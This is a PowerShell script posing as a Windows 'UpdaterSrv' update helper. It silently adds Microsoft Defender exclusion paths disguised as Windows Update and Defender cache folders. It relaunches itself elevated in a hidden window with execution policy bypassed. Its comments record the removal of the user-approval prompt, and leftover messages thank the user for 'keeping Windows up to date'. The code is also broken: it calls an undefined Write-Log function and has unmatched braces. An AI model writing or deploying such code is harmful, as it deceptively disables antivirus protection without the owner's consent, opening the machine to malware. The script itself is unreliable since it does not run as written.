# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Check if exclusions exist
    function Test-Exclusions {
        $currentExclusions = (Get-MpPreference).ExclusionPath
        $requiredExclusions = @(
            "$env:ProgramData\Microsoft\WindowsUpdate", # Common Windows path
            "$env:SystemRoot\Temp\MpCache"              # Defender temp folder
        )

        foreach ($path in $requiredExclusions) {
            if ($path -notin $currentExclusions) {
                return $false
            }
        }
        return $true
    }

    Write-Log "Starting update configuration check"

    if (Test-Exclusions) {
        Write-Log "Exclusions already configured. Exiting."
        exit 0
    }

    # --- MODIFICATION START ---
    # Remove the interactive prompt as services cannot interact with the desktop.
    # The C# service ensures this script runs with admin privileges, so direct application is safe.

    Write-Log "User approval implied by service execution. Proceeding with configuration."

    # Relaunch as admin if needed (This block is primarily for manual execution by non-admin)
    # When run by the C# service, this check will be false as it's already admin.
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Log "Script not running as administrator. Attempting to relaunch."
        $scriptPath = $MyInvocation.MyCommand.Path
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden
        exit # Exit current non-admin session
    }

    # Admin-only section (this is where the exclusions are added)
    Write-Log "Applying exclusions"
    $exclusions = @(
        "$env:ProgramData\Microsoft\WindowsUpdate",
        "$env:SystemRoot\Temp\MpCache"
    )

    foreach ($path in $exclusions) {
        try {
            if (-not (Test-Path $path)) {
                New-Item -Path $path -ItemType Directory -Force | Out-Null
                Write-Log "Created directory: $path"
            }
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            Write-Log "Added exclusion: $path"
        }
        catch {
            Write-Log "ERROR: Failed to add exclusion for $path. Error: $_"
        }
    }

    Write-Log "Configuration completed."

    # Remove the success message box as services cannot interact with the desktop.
    # [System.Windows.Forms.MessageBox]::Show(
    #    "Optimization complete. Thank you for keeping Windows up to date.",
    #    "Success",
    #    [System.Windows.Forms.MessageBoxButtons]::OK,
    #    [System.Windows.Forms.MessageBoxIcon]::Information
    # )

    # --- MODIFICATION END ---
}
catch {
    Write-Log "FATAL ERROR in main script block: $_"
    # Remove the error message box as services cannot interact with the desktop.
    # [System.Windows.Forms.MessageBox]::Show(
    #    "Configuration failed. Please try again later.",
    #    "Error",
    #    [System.Windows.Forms.MessageBoxButtons]::OK,
    #    [System.Windows.Forms.MessageBoxIcon]::Error
    # )
}
